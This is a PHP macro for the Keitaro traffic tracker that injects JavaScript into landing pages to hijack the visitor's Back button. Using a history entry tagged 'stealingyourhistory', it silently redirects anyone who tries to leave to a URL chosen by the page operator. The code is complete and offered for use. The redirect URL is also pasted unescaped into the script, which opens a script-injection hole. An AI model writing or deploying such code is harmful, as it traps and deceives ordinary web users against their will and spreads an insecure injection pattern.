<?php
namespace Macros;

use Traffic\Model\BaseStream;
use Traffic\RawClick;
use Traffic\Macros\AbstractClickMacro;

/*
  Macro for Keitaro Tracker(https://yellowweb.top/keitaro) 
  This macro replaces back button in users browser so it redirects the user to the url that you pass to the macro's parameter
  For example: {_replaceback:https://yellowweb.top}
  Put this macro right after the <body> tag.
  !!!DON'T USE THIS MACRO WITH {_disableback} MACRO!!!
  Author: Yellow Web (http://yellowweb.top)
 */
class replaceback extends AbstractClickMacro
{
    public function process(BaseStream $stream, RawClick $click, $url)
    {
		return "
		<script>
		(function(window, location) {
			history.replaceState(null, document.title, location.pathname+'#!/stealingyourhistory');
			history.pushState(null, document.title, location.pathname);

			window.addEventListener('popstate', function() {
			  if(location.hash === '#!/stealingyourhistory') {
					history.replaceState(null, document.title, location.pathname);
					setTimeout(function(){
					  location.replace('".$url."');
					},0);
			  }
			}, false);
		}(window, location));
		</script>";
    }
}